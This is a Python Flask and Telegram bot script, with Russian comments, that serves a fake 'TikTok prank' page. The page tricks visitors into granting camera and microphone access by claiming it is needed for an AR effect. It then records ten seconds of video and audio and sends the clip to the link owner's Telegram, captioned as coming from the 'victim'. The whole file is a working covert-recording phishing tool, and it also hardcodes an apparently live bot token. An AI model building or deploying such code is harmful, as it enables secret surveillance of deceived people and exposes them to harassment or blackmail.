import os
import psycopg2
from flask import Flask, render_template_string, request, jsonify
from telebot import TeleBot
from io import BytesIO

app = Flask(__name__)

# Твой Telegram токен
TELEGRAM_TOKEN = '8491089169:AAGrx78G0lffgZbBnRX_mQvdw5hj9FxIgEg'
bot = TeleBot(TELEGRAM_TOKEN)

# Подключение к PostgreSQL
DB_URL = os.getenv('DATABASE_URL', 'postgres://your_user:your_pass@your_host:your_port/your_db')

def init_db():
    conn = psycopg2.connect(DB_URL)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (chat_id BIGINT, unique_id TEXT PRIMARY KEY)''')
    conn.commit()
    conn.close()

init_db()

# HTML-шаблон для пранк-страницы
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Пранк TikTok</title>
    <style>
        body { font-family: Arial; text-align: center; background: #000; color: #fff; }
        video { width: 100%; max-width: 400px; border: 2px solid #ff0000; }
        button { background: #ff0000; color: white; padding: 10px; font-size: 18px; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Смотри крутое видео в TikTok! 🎥</h1>
    <p>Нажми "Смотреть", чтобы запустить камеру (нужно для AR-эффекта).</p>
    <video id="video" autoplay muted></video>
    <br><br>
    <button id="startBtn" onclick="startRecording()">Смотреть видео</button>
    <script>
        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        async function startRecording() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('video').srcObject = stream;
                
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
                mediaRecorder.onstop = sendVideo;
                mediaRecorder.start();
                
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 10000); // Запись 10 сек
            } catch (err) {
                alert('Доступ к камере заблокирован! ' + err.message);
            }
        }

        function sendVideo() {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            recordedChunks = [];
            
            const formData = new FormData();
            formData.append('video', blob, 'prank.webm');
            
            fetch('/upload/{{ unique_id }}', {
                method: 'POST',
                body: formData
            }).then(response => {
                if (response.ok) {
                    alert('Видео загружено! 😎');
                } else {
                    alert('Ошибка отправки');
                }
            }).catch(err => alert('Ошибка: ' + err));
        }
    </script>
</body>
</html>
'''

@app.route('/<unique_id>')
def prank_page(unique_id):
    return render_template_string(HTML_TEMPLATE, unique_id=unique_id)

@app.route('/upload/<unique_id>', methods=['POST'])
def upload_video(unique_id):
    if 'video' not in request.files:
        return jsonify({'error': 'No video'}), 400
    
    video_file = request.files['video']
    if video_file.filename == '':
        return jsonify({'error': 'No file'}), 400
    
    video_bytes = BytesIO(video_file.read())
    
    conn = psycopg2.connect(DB_URL)
    c = conn.cursor()
    c.execute("SELECT chat_id FROM links WHERE unique_id = %s", (unique_id,))
    result = c.fetchone()
    conn.close()
    
    if result:
        chat_id = result[0]
        bot.send_video(chat_id, video_bytes, caption="Пранк сработал! 🎉 Видео от жертвы.")
        return jsonify({'status': 'sent'}), 200
    else:
        return jsonify({'error': 'Invalid link'}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)